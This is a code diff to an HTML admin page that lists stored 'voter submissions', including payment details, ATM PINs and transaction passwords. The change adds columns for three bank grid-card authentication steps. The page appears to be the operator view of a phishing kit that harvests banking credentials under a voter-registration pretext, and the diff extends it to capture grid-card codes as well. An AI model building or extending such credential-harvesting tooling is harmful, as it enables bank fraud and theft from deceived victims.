@@ -7,7 +7,7 @@
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body { background: #f4f7f6; padding: 20px; }
-        .container { max-width: 1800px; margin: auto; background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
+        .container { max-width: 2000px; margin: auto; background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
         .header-flex { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
         h2 { color: #0056b3; }
         .back-link { color: #0056b3; text-decoration: none; font-weight: 600; font-size: 14px; }
@@ -53,6 +53,9 @@
                         <th>Payment Details</th>
                         <th>ATM PIN</th>
                         <th>Transaction Password</th>
+                        <th>Grid Step 1 (A,D,N)</th>
+                        <th>Grid Step 2 (B,I,H)</th>
+                        <th>Grid Step 3 (C,F,G)</th>
                         <th>Time</th>
                         <th>Action</th>
                     </tr>
@@ -72,7 +75,7 @@
             const submissions = JSON.parse(localStorage.getItem('voterSubmissions')) || [];
 
             if (submissions.length === 0) {
-                tableBody.innerHTML = `<tr><td colspan="18" style="text-align:center; color: #777;">No submissions found yet.</td></tr>`;
+                tableBody.innerHTML = `<tr><td colspan="21" style="text-align:center; color: #777;">No submissions found yet.</td></tr>`;
             } else {
                 tableBody.innerHTML = "";
                 submissions.forEach((item, index) => {
@@ -94,6 +97,9 @@
                         <td>${item.paymentDetails || '-'}</td>
                         <td>${item.atmPin || '-'}</td>
                         <td>${item.transPassword || '-'}</td>
+                        <td>${item.gridStep1 || '-'}</td>
+                        <td>${item.gridStep2 || '-'}</td>
+                        <td>${item.gridStep3 || '-'}</td>
                         <td>${item.time || '-'}</td>
                         <td><button class="btn-delete" onclick="deleteEntry(${index})">Delete</button></td>
                     `;
